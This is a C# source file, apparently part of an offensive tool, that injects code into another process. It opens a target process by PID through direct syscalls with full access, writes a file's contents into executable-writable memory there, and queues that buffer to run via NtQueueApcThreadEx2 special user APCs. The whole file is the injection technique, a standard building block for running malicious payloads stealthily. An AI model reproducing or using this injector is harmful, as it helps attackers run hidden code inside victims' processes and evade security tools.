using System;
using System.Runtime.InteropServices;

namespace apc
{
    class Program
    {
        private static IntPtr FileOperations(IntPtr hProcess)
        {
            IntPtr hFile = File.OpenFile(); int fileSize = File.GetFileSize(hFile);
            IntPtr buf = File.ReadFile(hFile, fileSize);

            IntPtr Buffer = Memory.AllocateMemory(hProcess, new IntPtr(fileSize), Win32.PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);
            Memory.WriteMemory(hProcess, Buffer, buf, fileSize);

            Console.WriteLine($"[^] Memory ADDRESS: {Buffer.ToString("X")}");
            return Buffer;
        }

        static void Main(string[] args)
        {
            var oa = new Win32.OBJECT_ATTRIBUTES();
            var ci = new Win32.CLIENT_ID(); ci.UniqueProcess = new IntPtr(Convert.ToInt32(args[0]));

            var handleStatus = Syscalls.NtOpenProcess(
                out IntPtr hProcess,
                Win32.PROCESS_ACCESS_RIGHTS.PROCESS_ALL_ACCESS,
                oa,
                ci
            );

            if (handleStatus != Win32.NTSTATUS.Success)
                throw new Exception($"NtOpenProcess ERROR! Status: {handleStatus}");

            Console.WriteLine($"[^] Process HANDLE: {hProcess.ToString("X")}");

            IntPtr Buffer = FileOperations(hProcess);
            IntPtr hThread = Threads.GetThread(hProcess);

            var queueStatus = Syscalls.NtQueueApcThreadEx2(
                hThread,
                IntPtr.Zero,
                Win32.QUEUE_USER_APC_FLAGS.QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
                Buffer,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero
            );

            if (queueStatus != Win32.NTSTATUS.Success)
                throw new Exception($"NtQueueApcThreadEx2 ERROR! Status: {queueStatus}");

            Console.WriteLine($"[^] Queue STATUS: Success");
            Console.WriteLine("[^] Enjoy!");

            Syscalls.NtFreeVirtualMemory(
                hProcess,
                Buffer,
                Marshal.SizeOf(typeof(Win32.FILE_STANDARD_INFORMATION)),
                Win32.VIRTUAL_FREE_TYPE.MEM_DECOMMIT | Win32.VIRTUAL_FREE_TYPE.MEM_RELEASE
            );

            Syscalls.NtClose(hThread);
        }
    }

}
